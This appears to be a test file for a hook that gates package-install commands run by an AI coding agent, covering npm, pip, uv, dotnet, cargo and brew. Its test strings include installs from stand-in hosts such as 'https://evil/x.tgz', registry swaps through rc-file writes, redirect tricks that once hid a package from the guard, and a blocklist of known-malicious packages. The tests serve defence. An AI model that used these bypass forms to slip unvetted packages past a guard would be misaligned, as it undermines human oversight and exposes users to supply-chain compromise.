      'uv pip install -r requirements.txt && cat uv.toml',
      'echo $UV_INDEX_URL && pip install zz-fake-py==1.0.0',
    ])('round 4 G2 raw rule: %j asks with the custom index reason', async (cmd) => {
      const r = await runHookFull(cmd, { stub: OLD });
      gated(r.decision); // ask, or deny when the run is unattended (CI, a subagent)
      expect(r.reason).toMatch(/Custom package index or config/);
    });
    it.each(['npm install left-pad@1.3.0', 'git status', 'npm config get cache'])('round 4 G2 regression: %j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
    });
    it.each(['cat .npmrc', 'npm config get registry', 'echo registry'])('round 4 G2: a raw mention alone (no install) keeps today\'s allow: %j', async (cmd) => {
      expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
    });
    it('PowerShell: $env:npm_config_registry then a bare install is gated', async () => {
      gated(await runHook(`$env:npm_config_registry='${REG}'; npm install`, { tool: 'PowerShell', stub: OLD }));
    });
    it('already covered: NPM_CONFIG_REGISTRY= prefix on a bare install is gated', async () => {
      gated(await runHook(`NPM_CONFIG_REGISTRY=${REG} npm install`, { stub: OLD }));
    });
    it('regression: a bare install stays allowed', async () => {
      expect(installSegments('npm install')).toEqual([]);
      expect(await runHook('npm install', { stub: OLD })).toBeUndefined();
    });
    it('changed (round 4): an unrelated config set chained with a bare install is gated (raw rule a)', async () => {
      expect(installSegments('npm config set loglevel warn && npm install')).toEqual(['npm install']);
      gated(await runHook('npm config set loglevel warn && npm install', { stub: OLD }));
    });
  });

  describe('G3: a variable interpreter before -m pip install', () => {
    it.each([
      '$PYTHON -m pip install zz-fake-pkg-a1',
      '${PY} -m pip install zz-fake-pkg-a1',
      '"$VENV/bin/python" -m pip install zz-fake-pkg-a1',
      '$VENV/bin/python -m pip install zz-fake-pkg-a1',
      '"$PYTHON" -m pip install zz-fake-pkg-a1',
      '${PY:-python3} -m pip install zz-fake-pkg-a1',
      '"${PY:-python3}" -m pip install zz-fake-pkg-a1',
    ])('%j is an unpinned pip install', (cmd) => {
      expect(unpinnedPipPackages(cmd)).toEqual(['zz-fake-pkg-a1']);
    });
    it('a pinned variable-interpreter install names its package and pin', () => {
      expect(extractPackageNames('${PY} -m pip install zz-fake-pkg-a1==1.0.0')).toEqual([{ name: 'zz-fake-pkg-a1', version: '1.0.0' }]);
    });
    it('built hook: an unpinned $PYTHON -m pip install is denied (not just asked)', async () => {
      expect(await runHook('$PYTHON -m pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
      expect(await runHook('"$VENV/bin/python" -m pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
    });
    it('round 4 low: a parameter expansion interpreter ${PY:-python3} with an unpinned install is denied', async () => {
      const r = await runHookFull('${PY:-python3} -m pip install zz-fake-pkg-a1', { stub: OLD });
      expect(r.decision).toBe('deny');
      expect(r.reason).toMatch(/zz-fake-pkg-a1/);
      expect(r.reason).not.toMatch(/cannot parse/);
    });
    it('built hook: a fresh pinned package behind ${PY} is denied by the age check', async () => {
      expect(await runHook('${PY} -m pip install zz-fake-pkg-a1==1.0.0', { stub: FRESH })).toBe('deny');
    });
    it('PowerShell: & $python -m pip install is unpinned', async () => {
      expect(await runHook('& $python -m pip install zz-fake-pkg-a1', { tool: 'PowerShell', stub: OLD })).toBe('deny');
    });
    it('regression: a variable interpreter running a script or pip list stays allowed', async () => {
      expect(await runHook('$PYTHON script.py', { stub: FRESH })).toBeUndefined();
      expect(await runHook('$PYTHON -m pip list', { stub: FRESH })).toBeUndefined();
      expect(await runHook('$PYTHON -m pytest -q', { stub: FRESH })).toBeUndefined();
    });
  });

  describe('G4: cargo binstall, dotnet add package, brew install', () => {
    it('cargo binstall is a cargo install', () => {
      expect(parseEcosystem('cargo binstall zz-fake-crate')).toBe('cargo');
      expect(pkgNames('cargo binstall zz-fake-crate')).toEqual(['zz-fake-crate']);
    });
    it('dotnet add package names the package, with or without a project argument', () => {
      expect(pkgNames('dotnet add package Zz.Fake')[0]).toBe('Zz.Fake');
      expect(pkgNames('dotnet add zz.csproj package Zz.Fake --version 1.0.0')[0]).toBe('Zz.Fake');
    });
    it('brew install names the formula', () => {
      expect(pkgNames('brew install zz-fake-pkg-a1')).toEqual(['zz-fake-pkg-a1']);
    });
    it.each([
      'cargo binstall zz-fake-crate',
      'dotnet add package Zz.Fake',
      'dotnet add zz.csproj package Zz.Fake --version 1.0.0',
      'brew install zz-fake-pkg-a1',
      'sudo brew install zz-fake-pkg-a1',
    ])('built hook gates %j like cargo install (no blocklist, OSV or age check)', async (cmd) => {
      const r = await runHookFull(cmd, { stub: OLD });
      gated(r.decision);
      expect(r.reason).toMatch(/No blocklist, OSV or age check exists/);
    });
    it.each([
      'dotnet add "zz proj.csproj" package Zz.Fake',
      "dotnet add 'zz proj.csproj' package Zz.Fake",
      'dotnet package add Zz.Fake',
      'dotnet tool install -g Zz.Fake',
      'dotnet tool update -g Zz.Fake',
      'dotnet.exe add package Zz.Fake',
      'C:\\dotnet\\dotnet.exe tool install Zz.Fake',
      'dotnet -d add package Zz.Fake',
      'dotnet --diagnostics add zz.csproj package Zz.Fake',
      'dotnet tool run zz-fake-tool',
      'dotnet tool exec Zz.Fake',
      'dotnet dnx Zz.Fake',
      'dnx Zz.Fake',
      'dnx.exe Zz.Fake --yes',
    ])('built hook gates the dotnet form %j', async (cmd) => {
      const r = await runHookFull(cmd, { stub: OLD });
      gated(r.decision);
    });
    it.each(['dotnet tool list', 'dotnet package list', 'dotnet add "zz proj.csproj" reference ../x.csproj', 'dotnet ef database update', 'dotnet tool restore'])('regression: %j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
    });
    it('changed (round 3 MEDIUM a): 4 option pairs (8 words, the bound) before and after add still match', () => {
      const words = Array(4).fill('-x zz').join(' ');
      const t0 = Date.now();
      expect(isPackageInstallCommand(`dotnet ${words} add ${words} reference`)).toBe(false);
      expect(isPackageInstallCommand(`dotnet ${words} add ${words} package Zz.Fake`)).toBe(true);
      expect(Date.now() - t0).toBeLessThan(2000);
    });
    it('regression: cargo install is still gated the same way', async () => {
      gated(await runHook('cargo install zz-fake-crate', { stub: OLD }));
    });
    it.each([
      'dotnet add reference ../zz.csproj',
      'dotnet build',
      'brew list',
      'brew --version',
      'cargo build',
    ])('regression: %j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
    });
  });

  // ----- Round 3 verify (aegis): HIGH 1-3, MEDIUM a-e -----
  describe('round 3 verify', () => {
    async function tempRoot(): Promise<string> {
      const { mkdtempSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      return mkdtempSync(join(tmpdir(), 'pig-r3-'));
    }
    /** <root>/node_modules/.bin with these files, and these names as folders (each holds a file k). */
    async function binDir(root: string, files: string[], dirs: string[] = []): Promise<string> {
      const { mkdirSync, writeFileSync } = await import('node:fs');
      const { join } = await import('node:path');
      const bin = join(root, 'node_modules', '.bin');
      mkdirSync(bin, { recursive: true });
      writeFileSync(join(root, 'package.json'), '{}');
      for (const f of files) writeFileSync(join(bin, f), '');
      for (const d of dirs) { mkdirSync(join(bin, d)); writeFileSync(join(bin, d, 'k'), ''); }
      return root;
    }
    const MAL: Stub = { ageHours: 2400, osvMal: true };

    describe('HIGH 1: the local bin must be a file with the exact name', () => {
      it('a folder named like the bin is not a bin: cd ./d; npx and plain npx in d both deny', async () => {
        const { join } = await import('node:path');
        const root = await tempRoot();
        const d = await binDir(join(root, 'd'), [], ['zz-lodahs-a1']);
        expect(await runHook('cd ./d; npx zz-lodahs-a1', { stub: FRESH, cwd: root })).toBe('deny');
        expect(await runHook('npx zz-lodahs-a1', { stub: FRESH, cwd: d })).toBe('deny');
      });
      it.each(['zz-lodahs-b2.cmd', 'zz-lodahs-b2.ps1'])('a lone %s is not the bin npm runs: npx denies', async (file) => {
        const cwd = await binDir(await tempRoot(), [file]);
        expect(await runHook('npx zz-lodahs-b2', { stub: FRESH, cwd })).toBe('deny');
      });
      it('regression: the exact-name file still skips the checks', async () => {
        const cwd = await binDir(await tempRoot(), ['zz-lodahs-c3']);
        expect(await runHook('npx zz-lodahs-c3', { stub: FRESH, cwd })).toBeUndefined();
      });
    });

    describe('HIGH 2: an unknown uv global option before the verb asks', () => {
      it.each([
        'uv --preview-features run pip install zz-fake-pkg-a1',
        'uv --zz-unknown run --with zz-fake-pkg-a1 python x.py',
        'uv --zz-unknown=1 add zz-fake-pkg-a1',
      ])('%j is gated as a command the guard cannot parse', async (cmd) => {
        const r = await runHookFull(cmd, { stub: OLD });
        gated(r.decision);
        expect(r.reason).toMatch(/cannot parse/);
      });
      it('regression: listed uv flags still read the plain form', async () => {
        expect(await runHook('uv -q --offline --no-cache run --with zz-fake-pkg-a1 python x.py', { stub: FRESH })).toBe('deny');
        expect(await runHook('uv --quiet run pytest -q', { stub: FRESH })).toBeUndefined();
      });
    });

    describe('HIGH 3: Bash splits an unquoted variable interpreter into words', () => {
      it.each([
        "PY='npx lodahs'; $PY -m pip install zz-fake-pkg-a1==1.0.0",
        '${PY} -m pip install zz-fake-pkg-a1==1.0.0',
        '$VENV/bin/python -m pip install zz-fake-pkg-a1==1.0.0',
      ])('Bash: %j (pinned, clean) is gated', async (cmd) => {
        gated(await runHook(cmd, { stub: OLD }));
      });
      it.each([
        ['Bash', '"$PY" -m pip install zz-fake-pkg-a1==1.0.0'],
        ['Bash', '"${PY}" -m pip install zz-fake-pkg-a1==1.0.0'],
        ['Bash', '"$VENV/bin/python" -m pip install zz-fake-pkg-a1==1.0.0'],
        ['PowerShell', '& $python -m pip install zz-fake-pkg-a1==1.0.0'],
        ['PowerShell', '& $env:PYTHON -m pip install zz-fake-pkg-a1==1.0.0'],
      ])('regression: %s %j (one interpreter word, pinned, clean) allows', async (tool, cmd) => {
        expect(await runHook(cmd, { tool, stub: OLD })).toBeUndefined();
      });
    });

    describe('MEDIUM a/b: no catastrophic backtracking', () => {
      it('1500 repeated "dotnet add" words scan in under 1 s', () => {
        const t0 = Date.now();
        expect(installSegments('echo' + ' dotnet add'.repeat(1500) + '; npx zz-fake-pkg-a1')).toContain('npx zz-fake-pkg-a1');
        expect(Date.now() - t0).toBeLessThan(1000);
      }, 60_000);
      it.each([
        'npm' + ' --prefix'.repeat(45) + ' zz; pip install zz-fake-pkg-a1',
        'pip' + ' --proxy'.repeat(45) + ' zz; npm install zz-fake-pkg-a1',
      ])('45 repeated value flags do not stall the hook (#%#)', async (cmd) => {
        const t0 = Date.now();
        gated(await runHook(cmd, { stub: FRESH }));
        expect(Date.now() - t0).toBeLessThan(5000);
      }, 30_000);
    });

    describe('MEDIUM c: rc-file and environment writes count as a registry change', () => {
      it.each([
        ['PowerShell', `Set-Content .npmrc "registry=${REG}"; npm install`],
        ['PowerShell', `Set-Content -Path '.npmrc' -Value 'registry=${REG}'; npm install`],
        ['PowerShell', `Add-Content .yarnrc.yml "npmRegistryServer: ${REG}"; yarn install`],
        ['PowerShell', `"registry=${REG}" | Out-File .npmrc; npm install`],
        ['PowerShell', `sc .npmrc "registry=${REG}"; npm install`],
        ['PowerShell', 'Copy-Item zz.npmrc .npmrc; npm ci'],
        ['PowerShell', 'Move-Item zz.txt .npmrc; npm install'],
        ['PowerShell', `Set-Item Env:npm_config_registry '${REG}'; npm install`],
        ['PowerShell', `[Environment]::SetEnvironmentVariable('npm_config_registry', '${REG}', 'User'); npm install`],
        ['Bash', 'cp zz.npmrc .npmrc && npm install'],
        ['Bash', 'mv zz.toml bunfig.toml && bun install'],
        ['Bash', `echo 'registry = "${REG}"' > bunfig.toml && bun install`],
        ['Bash', 'cp zz.ini pip.ini && pip install -r requirements.txt'],
        ['Bash', 'cp zz.conf ~/.config/pip/pip.conf && pip install -r requirements.txt'],
      ])('%s: %j is gated', async (tool, cmd) => {
        gated(await runHook(cmd, { tool, stub: OLD }));
      });
      it.each([
        ['PowerShell', "Set-Content notes.txt 'hello'; npm install"],
        ['Bash', 'cp a.txt b.txt && npm install'],
      ])('regression: %s %j allows', async (tool, cmd) => {
        expect(await runHook(cmd, { tool, stub: OLD })).toBeUndefined();
      });
      it('changed (round 4 G2 raw rule): echoing a registry variable then a bare install is gated', async () => {
        gated(await runHook('echo $env:npm_config_registry; npm install', { tool: 'PowerShell', stub: OLD }));
      });
    });

    describe('MEDIUM d: a pypi version is known only with an exact pin', () => {
      it.each(["uv add 'zz-fake-pkg-a1>=1.0'", 'uv add zz-fake-pkg-a1~=1.0', "poetry add 'zz-fake-pkg-a1<2.0'"])('%j: the OSV deny says the version is unknown', async (cmd) => {
        const r = await runHookFull(cmd, { stub: MAL });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
      });
      it.each(['pip install zz-fake-pkg-a1==1.0.0', 'uv add zz-fake-pkg-a1===1.0.0'])('regression: %j names the advisory with no unknown note', async (cmd) => {
        const r = await runHookFull(cmd, { stub: MAL });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).not.toMatch(/unknown/i);
      });
    });

    describe('MEDIUM e: more options that move the folder make it unknown', () => {
      // Unquoted folder and -c: the wrapper payload is read, and -c (unlike -Command) does not hit the -C option arm.
      const u = (d: string) => d.replace(/\\/g, '/');
      it.each([
        (d: string) => `pwsh -WorkingDirectory ${u(d)} -c "npx zz-lodahs-c3"`,
        (d: string) => `pwsh -wd ${u(d)} -c "npx zz-lodahs-c3"`,
        (d: string) => `powershell -workingdirectory ${u(d)} -c "npx zz-lodahs-c3"`,
        (d: string) => `sudo -D "${d}" npx zz-lodahs-c3`,
        (d: string) => `sudo -D"${d}" npx zz-lodahs-c3`,
      ])('payload cwd has the bin, but %s moves away: denies (#%#)', async (make) => {
        const cwd = await binDir(await tempRoot(), ['zz-lodahs-c3']);
        expect(await runHook(make(await tempRoot()), { stub: FRESH, cwd })).toBe('deny');
      });
    });
  });

  // ----- 2026-11-05: file-descriptor redirections are not install sources (candidate strip-fd-redirects) -----
  // `npm ci 2>&1` was asked as "Non-registry source: 2>": the `&` split left the word `2>`. Only a pure fd
  // redirection (N>&M, >&N, N>&-, and a redirect to /dev/null, or $null in PowerShell) is removed, outside
  // quotes and escapes. Any other `>` word (a file target, a variable target) stays and still asks.
  describe('fd redirections are not install sources', () => {
    async function lockDir(withLockfile: boolean): Promise<string> {
      const { mkdtempSync, writeFileSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const dir = mkdtempSync(join(tmpdir(), 'pig-fdredir-'));
      if (withLockfile) writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
      return dir;
    }

    it.each([
      'npm ci 2>&1',
      'npm ci --ignore-scripts --no-audit --no-fund 2>&1',
      'npm ci --ignore-scripts --no-audit --no-fund 2>&1 | tail -5',
      'npm ci 2>&1 --no-audit',
      '2>&1 npm ci',
      'npm ci 2>/dev/null',
      'npm ci 2> /dev/null',
      'npm ci >/dev/null 2>&1',
      'npm ci > /dev/null 2>&1',
      'npm ci 1>&2',
      'npm ci >&2',
      'npm ci 2>&-',
      'npm ci &>/dev/null',
      'npm ci &> /dev/null',
      '(npm ci 2>&1)',
      'pnpm install --frozen-lockfile 2>&1',
      'yarn install 2>&1',
      'pip install -r requirements.txt 2>&1',
      'bash -c "npm ci 2>&1"',
    ])('allows %j in a folder with a lockfile', async (cmd) => {
      const r = await runHookFull(cmd, { stub: FRESH, cwd: await lockDir(true) });
      expect(r.reason).not.toMatch(/Non-registry source/);
      expect(r.decision).toBeUndefined();
    });

    it.each([
      'npm ci 2>$null',
      'npm ci *>&1',
      'npm ci 2>&1 | Out-Null',
      'npm ci *>$null',
    ])('allows %j in PowerShell in a folder with a lockfile', async (cmd) => {
      const r = await runHookFull(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) });
      expect(r.reason).not.toMatch(/Non-registry source/);
      expect(r.decision).toBeUndefined();
    });

    it('PowerShell Set-Location then npm ci 2>&1 still asks for the folder, but no longer for the redirect', async () => {
      const dir = await lockDir(true);
      const r = await runHookFull(`Set-Location ${dir.replace(/\\/g, '/')}; npm ci --ignore-scripts --no-audit --no-fund 2>&1`, { tool: 'PowerShell', stub: FRESH, cwd: dir });
      gated(r.decision);
      expect(r.reason).toMatch(/folder the guard cannot vouch for/i);
      expect(r.reason).not.toMatch(/Non-registry source/);
    });

    it('npm ci 2>&1 with no lockfile still asks', async () => {
      gated(await runHook('npm ci --ignore-scripts 2>&1', { stub: FRESH, cwd: await lockDir(false) }));
    });

    // Must-still-block: removing the redirect must not hide a source or a package.
    it.each([
      'npm install ./evil 2>&1',
      'npm install git+https://x/y 2>&1',
      'npm install 2>&1 https://evil/x.tgz',
      'npm install 2>&1 ./evil',
      'npm install github:user/repo 2>/dev/null',
      'npm install file:../evil >/dev/null 2>&1',
      'npm i foo 2>file.tgz',
      'npm i foo 2>err.log',
      'npm ci 2>$FD',
      'npm ci 2>&$FD',
      'npm install 2>&1 zz-fresh-pkg',
      'npm install zz-fresh-pkg 2>&1',
      'npm ci 2>&1; npm install zz-fresh-pkg',
      'npm ci > /dev/null; npm install zz-fresh-pkg',
      'pip install https://evil/x.whl 2>&1',
      "npm install '2>&1'",
      'npm install "2>&1"',
      'npm install 2\\>\\&1',
      "npm install '2>/dev/null'",
      "R='2>&1'; npm install $R",
      'npm install "$R"',
    ])('still gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir(true) }));
    });

    it('still gates a package named after a redirect in PowerShell, quoted or backtick-escaped', async () => {
      for (const cmd of ["npm install '2>&1'", 'npm install `2>&1', 'npm install "2>&1"']) {
        gated(await runHook(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) }));
      }
    });

    it('a redirect inside a quoted string is not removed', async () => {
      // The quoted text holds the install, so no segment runs it; the payload of bash -c does run, redirect or not.
      expect(await runHook('echo "npm install zz-fresh-pkg 2>&1"', { stub: FRESH, cwd: await lockDir(true) })).toBeUndefined();
      gated(await runHook('bash -c "npm install zz-fresh-pkg 2>&1"', { stub: FRESH, cwd: await lockDir(true) }));
    });

    // The quote and escape tracking, read on the function itself. In the built hook a stripped quoted string
    // still gates (it keeps a space), so only the text shows whether the tracking works.
    describe('stripFdRedirects text', () => {
      it.each([
        ['npm ci 2>&1', 'npm ci '],
        ['npm ci >/dev/null 2>&1 | tail', 'npm ci   | tail'],
        ['npm ci &> /dev/null', 'npm ci '],
      ])('removes the bare redirect in %j', (cmd, want) => {
        expect(stripFdRedirects(cmd)).toBe(want);
      });

      it.each([
        ['echo "a 2>&1 b"', 'Bash'],
        ["echo 'a 2>/dev/null b'", 'Bash'],
        ['echo "a\\" 2>&1 b"', 'Bash'],
        ['echo "a 2>&1', 'Bash'],
        ['echo a2>&1', 'Bash'],
        ['echo "a" 2>err.log', 'Bash'],
        ['echo a > out.txt', 'Bash'],
        ['echo a 2>$FD', 'Bash'],
        ['echo a 2>$null', 'Bash'],
        ['echo "a 2>&1 b"', 'PowerShell'],
        ["echo 'a 2>$null b'", 'PowerShell'],
        ['echo "a`" 2>&1 b"', 'PowerShell'],
        ['echo a 2>err.log', 'PowerShell'],
      ])('keeps %j as typed (%s)', (cmd, tool) => {
        expect(stripFdRedirects(cmd, tool)).toBe(cmd);
      });

      it('a backslash inside single quotes is not an escape in Bash, so the redirect after the quote goes', () => {
        expect(stripFdRedirects("echo 'a\\' 2>&1")).toBe("echo 'a\\' ");
      });

      it('a backtick inside single quotes is not an escape in PowerShell, so the redirect after the quote goes', () => {
        expect(stripFdRedirects("echo 'a`' 2>&1", 'PowerShell')).toBe("echo 'a`' ");
      });
    });

    // Judge additions (2026-11-05).
    it('a &>/dev/null redirect before a fresh package no longer hides the package', async () => {
      // Base allowed this: the lone & cut the segment and the package fell into a non-install segment.
      expect(await runHook('npm install &>/dev/null zz-fresh-pkg', { stub: FRESH, cwd: await lockDir(true) })).toBe('deny');
    });

    it('a custom registry after a redirect names the URL, not the redirect', async () => {
      const r = await runHookFull('npm install --registry 2>&1 https://e.invalid/', { stub: FRESH, cwd: await lockDir(true) });
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/e\.invalid/);
      expect(r.reason).not.toMatch(/--registry 2>/);
    });

    it('a PowerShell install of ./evil behind a backtick-escaped 2>&1 is gated', async () => {
      gated(await runHook('npm install `2>&1 ./evil', { tool: 'PowerShell', stub: FRESH, cwd: await lockDir(true) }));
    });
  });

  // ----- 2026-11-05: `&>file` must not hide a package (second PR, HIGH bypass found by the workflow) -----
  // parseExecutable cuts at every lone `&`, so `npm install &>log zz-fresh-pkg` became the segments
  // `npm install ` and `>log zz-fresh-pkg`, and the package was never checked. In Bash `&>` is an operator
  // even inside a word (`npm install&>log pkg` also installs pkg). parseExecutable now keeps an unquoted
  // `&>` / `&>>` in one segment with its command. stripFdRedirects removes only `&>/dev/null`.
  describe('&>file redirections do not hide a package', () => {
    async function lockDir(): Promise<string> {
      const { mkdtempSync, writeFileSync } = await import('node:fs');
      const { tmpdir } = await import('node:os');
      const { join } = await import('node:path');
      const dir = mkdtempSync(join(tmpdir(), 'pig-ampgt-'));
      writeFileSync(join(dir, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
      return dir;
    }

    it.each([
      'npm install &>log zz-fresh-pkg',
      'npm install &> log zz-fresh-pkg',
      'npm install &>>log zz-fresh-pkg',
      'npm install &>> log zz-fresh-pkg',
      'npm install&>log zz-fresh-pkg',
      'npm install &>log 2>&1 zz-fresh-pkg',
      'npm install zz-fresh-pkg &>log',
      'npm install ./evil &>log',
      'npm install&>log ./evil',
      'pip install https://evil/x.whl &>log',
      'npm ci --no-audit &>log; npm install zz-fresh-pkg',
    ])('gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir() }));
    });

    it('denies a fresh package behind &>log with the package named, not a redirect', async () => {
      const r = await runHookFull('npm install &>log zz-fresh-pkg', { stub: FRESH, cwd: await lockDir() });
      expect(r.decision).toBe('deny');
      expect(r.reason).toMatch(/zz-fresh-pkg/);
    });

    it.each([
      'npm ci &>/dev/null',
      'npm ci &> /dev/null',
      'npm ci &>>/dev/null',
      'npm ci&>/dev/null',
      'npm ci --no-audit --no-fund &>/dev/null',
    ])('still allows %j in a folder with a lockfile', async (cmd) => {
      const r = await runHookFull(cmd, { stub: FRESH, cwd: await lockDir() });
      expect(r.decision).toBeUndefined();
    });

    it.each([
      'echo "npm install zz-fresh-pkg &>log"',
      "echo 'npm install zz-fresh-pkg &>log'",
    ])('does not read the quoted text %j as an install', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH, cwd: await lockDir() })).toBeUndefined();
    });

    it('a quoted &>log inside bash -c is still read as the payload and gated', async () => {
      gated(await runHook('bash -c "npm install &>log zz-fresh-pkg"', { stub: FRESH, cwd: await lockDir() }));
    });

    it('PowerShell has no &> operator: its text is not rewritten', async () => {
      expect(stripFdRedirects('npm install &>log zz-fresh-pkg', 'PowerShell')).toBe('npm install &>log zz-fresh-pkg');
    });

    // The parser (parseExecutable) now keeps `&>` inside one segment, so the words after the target stay
    // with the command. PowerShell has no `&>`, but keeping the text whole fails closed there too.
    it.each([
      'npm install &>log zz-fresh-pkg',
      'npm &>l install zz-fresh-pkg',
      'npx &>l -y zz-fresh-pkg',
    ])('gates a PowerShell install behind &>: %j', async (cmd) => {
      gated(await runHook(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await lockDir() }));
    });

    // The glued `&>/dev/null` strip: without it `bash -c&>/dev/null "..."` loses its wrapper flag.
    it.each([
      'bash -c&>/dev/null "npm install zz-fresh-pkg"',
      'sh -c&>/dev/null "npm i zz-fresh-pkg"',
      'bash -lc&>>/dev/null "npm i zz-fresh-pkg"',
      'bash -c&> /dev/null "npm install zz-fresh-pkg"',
    ])('gates a shell-wrapper payload behind a glued &>/dev/null: %j', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH, cwd: await lockDir() }));
    });

    it('still allows an old clean package behind a glued &>/dev/null', async () => {
      const r = await runHookFull('npm i zz-fresh-pkg&>/dev/null', { stub: OLD, cwd: await lockDir() });
      expect(r.decision).toBeUndefined();
    });

    describe('stripFdRedirects text', () => {
      it.each([
        ['npm install &>log 2>&1 zz', 'npm install &>log  zz'],
        ['npm ci &>/dev/null', 'npm ci '],
        ['npm ci&>/dev/null', 'npm ci '],
        ['bash -c&>/dev/null "x"', 'bash -c  "x"'],
      ])('rewrites %j', (cmd, want) => {
        expect(stripFdRedirects(cmd)).toBe(want);
      });

      it.each([
        ['echo "a &>log b"', 'Bash'],
        ["echo 'a &>log b'", 'Bash'],
        ['echo a \\&>log', 'Bash'],
        ['echo a &>', 'Bash'],
        ['echo a &> ', 'Bash'],
        ['echo a &>;', 'Bash'],
        ['echo a &>&2', 'Bash'],
        ['echo a &&>log', 'Bash'],
        ['echo a |&>log', 'Bash'],
        ['echo "a &>log', 'Bash'],
        ['npm install &>log zz', 'Bash'],
        ['npm install &> log zz', 'Bash'],
        ['npm install &>>log zz', 'Bash'],
        ['npm install zz &>log', 'Bash'],
        ['npm install&>log zz', 'Bash'],
        ['npm install &>"my log" zz', 'Bash'],
        ['a &>x; b &>y', 'Bash'],
        ['echo a &>log', 'PowerShell'],
        ['echo a &>> log', 'PowerShell'],
        ['echo a &>/dev/null', 'PowerShell'],
        ['echo "a &>log" b', 'PowerShell'],
      ])('keeps %j as typed (%s)', (cmd, tool) => {
        expect(stripFdRedirects(cmd, tool)).toBe(cmd);
      });
    });
  });
});

// F15 blocklist exact-string half: a probe. The blocklist compares version and name as plain strings.
// These cases decide whether it reproduces: if a case fails, the form slips past the blocklist.
describe('F15 blocklist exact-string probe', () => {
  const blockedFor = (command: string, eco: 'npm' | 'pypi') => {
    const [pkg] = extractPackageNames(command);
    return checkMaliciousPackage(pkg.name, pkg.version, eco).blocked;
  };
  it('control: colors@1.4.1 is blocked', () => {
    expect(blockedFor('npm install colors@1.4.1', 'npm')).toBe(true);
  });
  it('control: litellm==1.82.7 is blocked', () => {
    expect(blockedFor('pip install litellm==1.82.7', 'pypi')).toBe(true);
  });
  it('npm: colors@=1.4.1 is blocked', () => {
    expect(blockedFor('npm install colors@=1.4.1', 'npm')).toBe(true);
  });
  it('npm: colors@v1.4.1 is blocked', () => {
    expect(blockedFor('npm install colors@v1.4.1', 'npm')).toBe(true);
  });
  it('npm: colors@1.4.1+build is blocked', () => {
    expect(blockedFor('npm install colors@1.4.1+build', 'npm')).toBe(true);
  });
  it('npm: a range that includes a blocked version (colors@^1.4.1) at least warns', () => {
    const [pkg] = extractPackageNames('npm install colors@^1.4.1');
    const r = checkMaliciousPackage(pkg.name, pkg.version, 'npm');
    expect(r.blocked || !!r.warning).toBe(true);
  });
  it('pypi: litellm==1.82.7.0 (PEP 440 equal to 1.82.7) is blocked', () => {
    expect(blockedFor('pip install litellm==1.82.7.0', 'pypi')).toBe(true);
  });
  it('pypi: litellm==01.82.7 (PEP 440 equal) is blocked', () => {
    expect(blockedFor('pip install litellm==01.82.7', 'pypi')).toBe(true);
  });
  it('pypi: litellm==v1.82.7 (PEP 440 equal) is blocked', () => {
    expect(blockedFor('pip install litellm==v1.82.7', 'pypi')).toBe(true);
  });
  it('pypi: the key jeIlyfish (capital I) blocks the same name', () => {
    expect(checkMaliciousPackage('jeIlyfish', undefined, 'pypi').blocked).toBe(true);
  });
  it('pypi: python3_dateutil (PyPI name normalisation of python3-dateutil) is blocked', () => {
    expect(checkMaliciousPackage('python3_dateutil', undefined, 'pypi').blocked).toBe(true);
  });
  it('pypi: Python3.Dateutil is blocked', () => {
    expect(checkMaliciousPackage('Python3.Dateutil', undefined, 'pypi').blocked).toBe(true);
  });
});
